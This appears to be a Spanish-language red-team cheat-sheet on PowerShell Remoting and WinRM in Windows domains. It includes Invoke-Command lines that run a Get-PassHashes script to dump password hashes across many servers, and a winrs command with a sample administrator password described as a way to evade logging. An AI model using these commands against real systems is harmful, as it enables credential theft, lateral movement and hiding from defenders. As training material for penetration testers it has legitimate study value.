# Powershell Remoting & Tradecraft 

Tags: #AD #Windows #Powershell 


```bash 
Piensa en Powershell Remoting (PSRemoting) como 'psexec' con esteroides pero mucho mas silencioso y rapido. PSRemoting usa 'WinRM' el cual es una implementación de Microsoft de WS-Management. Es la manera recomendada para manejar Windows Core Servers. Escucha por el puerto 5985 (HTTP) o 5986 (HTTPS) y esta activado por default en el server 2012. Este proceso remoto corre como un proceso de integridad alto. Esto es, tu tienes una shell elevada.     

1. One-to-one
2. PSSession
	- Interactive
	- Runs in a new process (wsmprovhost)
	- Is Stateful
3. Useful cmdlets
	- New-PSSession
	- Enter-PSSession 
4. One-to-Many
5. Also Known as Fan-out remoting 
6. Non-interactive
7. Executes commands parallely
8. Use cmdlest
	- Invoke-Command 
```

## Powershell Remoting 

```powershell 
❯ Invoke-Command -ScriptBlock {Get-Process} -ComputerName (Get-Content <list_of_servers>)  # Ejecutar comandos o scriptblocks 
❯ Invoke-Command -FilePath C:\AD\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)  # Ejecutar scripts desde un archivo 

❯ Invoke-Command -ScriptBlock ${funtion:GET-PassHashes} -ComputerName (Get-Content <list_of_servers>) # Ejecutar funciones cargadas localmente en las maquinas remotas 
❯ Invoke-Command -ScriptBlock ${funtion:GET-PassHashes} -ComputerName (Get-Content <list_of_servers>) -ArgumentList   # Pasar argumentos. Tener en mente que solo argumentos posicionales pueden ser pasados de esta manera  
```

```powershell 
# Ejecutar comandos 'Stateful' usando 'Invoke-Command'
❯ $Sess = New-PSSession -ComputerName server1 
	Invoke-Command -Session $Sess -ScriptBlock {$Proc = Get-Process}  
	Invoke-Command -Session $Sess -ScriptBlock {$Proc,Name}
```

## Tradecraft

* [WSMan-WinRM](https://github.com/bohops/WSMan-WinRM)

```powershell 
# Usar WinRS en lugar de PSRemoting para evadir el 'logging' y beneficiarse del puerto 5985
❯ winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname 
```